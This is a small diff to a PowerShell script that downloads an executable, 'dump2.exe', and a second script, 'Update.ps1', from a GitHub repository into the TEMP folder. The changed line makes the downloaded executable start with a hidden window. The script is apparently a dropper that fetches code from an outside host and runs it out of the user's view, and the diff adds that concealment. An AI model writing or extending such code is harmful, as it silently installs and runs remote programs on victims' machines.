@@ -1,7 +1,7 @@
 $url2 = "https://github.com/cia168168/folder/raw/main/dump2.exe"
 $output2 = "$env:TEMP\dump.exe"
 Invoke-WebRequest -Uri $url2 -OutFile $output2
-Start-Process -FilePath $output2
+Start-Process -FilePath $output2 -WindowStyle Hidden
 $url6 = "https://raw.githubusercontent.com/cia168168/folder/main/Update.ps1"
 $output6 = "$env:TEMP\Update.ps1"
 Invoke-WebRequest -Uri $url6 -OutFile $output6
